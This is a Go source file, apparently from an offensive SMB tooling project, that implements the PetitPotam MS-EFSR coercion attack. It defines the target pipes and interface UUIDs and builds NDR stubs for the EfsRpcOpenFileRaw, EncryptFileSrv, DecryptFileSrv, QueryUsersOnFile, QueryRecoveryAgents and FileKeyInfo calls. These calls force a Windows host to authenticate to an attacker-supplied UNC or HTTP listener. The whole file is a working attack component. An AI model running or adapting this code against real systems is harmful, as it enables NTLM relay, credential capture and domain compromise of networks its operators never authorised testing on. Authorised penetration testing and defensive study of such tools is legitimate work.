package coerce

import (
	"context"

	"github.com/ineffectivecoder/SMBGooser/pkg/dcerpc"
)

// PetitPotam implements MS-EFSR coercion (PetitPotam attack)
type PetitPotam struct{}

// NewPetitPotam creates a PetitPotam coercer
func NewPetitPotam() *PetitPotam {
	return &PetitPotam{}
}

func (p *PetitPotam) Name() string {
	return "PetitPotam"
}

func (p *PetitPotam) Description() string {
	return "MS-EFSR (Encrypting File System Remote) - EfsRpcOpenFileRaw and related functions"
}

func (p *PetitPotam) PipeName() string {
	return "lsarpc" // Also works on efsrpc
}

func (p *PetitPotam) InterfaceUUID() dcerpc.UUID {
	return dcerpc.EFSR_UUID
}

func (p *PetitPotam) InterfaceVersion() uint32 {
	return 1
}

func (p *PetitPotam) Opnums() []OpnumInfo {
	return []OpnumInfo{
		{0, "EfsRpcOpenFileRaw", "Primary coercion function"},
		{4, "EfsRpcEncryptFileSrv", "Encrypt file - triggers UNC access"},
		{5, "EfsRpcDecryptFileSrv", "Decrypt file - triggers UNC access"},
		{6, "EfsRpcQueryUsersOnFile", "Query users - triggers UNC access"},
		{7, "EfsRpcQueryRecoveryAgents", "Query recovery agents - triggers UNC access"},
		{12, "EfsRpcFileKeyInfo", "File key info - triggers UNC access"},
	}
}

func (p *PetitPotam) Coerce(ctx context.Context, rpc *dcerpc.Client, listener string, opts CoerceOptions) error {
	opnums := p.getOpnums(opts)
	paths := buildCallbackPaths(listener, opts.UseHTTP, opts.HTTPPort)

	var lastErr error
	for _, opnum := range opnums {
		for _, path := range paths {
			stub := p.createStub(path, opnum.Opnum)
			_, err := rpc.Call(opnum.Opnum, stub)

			if err != nil {
				// Check for success indicators
				if isCoercionSuccess(err) {
					return nil // Success!
				}
				lastErr = err
				continue
			}

			// No error - might be success or patched
			if opnum.Opnum != 0 {
				// Non-opnum-0 success is likely real
				return nil
			}
		}
	}

	return lastErr
}

func (p *PetitPotam) getOpnums(opts CoerceOptions) []OpnumInfo {
	if opts.SpecificOpnum >= 0 {
		for _, op := range p.Opnums() {
			if op.Opnum == uint16(opts.SpecificOpnum) {
				return []OpnumInfo{op}
			}
		}
	}
	return p.Opnums()
}

// createStub creates the NDR-encoded stub for EfsRpc* functions
func (p *PetitPotam) createStub(path string, opnum uint16) []byte {
	w := dcerpc.NewNDRWriter()

	switch opnum {
	case 0: // EfsRpcOpenFileRaw
		// FileName (unique pointer + conformant varying string)
		w.WritePointer()
		w.WriteUnicodeString(path)
		// Flags (uint32)
		w.WriteUint32(0)

	case 4, 5: // EfsRpcEncryptFileSrv, EfsRpcDecryptFileSrv
		// FileName (conformant varying string)
		w.WriteUnicodeString(path)

	case 6, 7: // EfsRpcQueryUsersOnFile, EfsRpcQueryRecoveryAgents
		// FileName (conformant varying string)
		w.WriteUnicodeString(path)

	case 12: // EfsRpcFileKeyInfo
		// FileName (conformant varying string)
		w.WriteUnicodeString(path)
		// InfoClass (uint32)
		w.WriteUint32(0)
	}

	return w.Bytes()
}

// AlternatePipe returns alternative pipe for PetitPotam
func (p *PetitPotam) AlternatePipe() string {
	return "efsrpc"
}

// AlternateUUID returns the alternate UUID for efsrpc pipe
func (p *PetitPotam) AlternateUUID() dcerpc.UUID {
	// Native EFSR interface UUID (for efsrpc pipe)
	return dcerpc.MustParseUUID("df1941c5-fe89-4e79-bf10-463657acf44d")
}
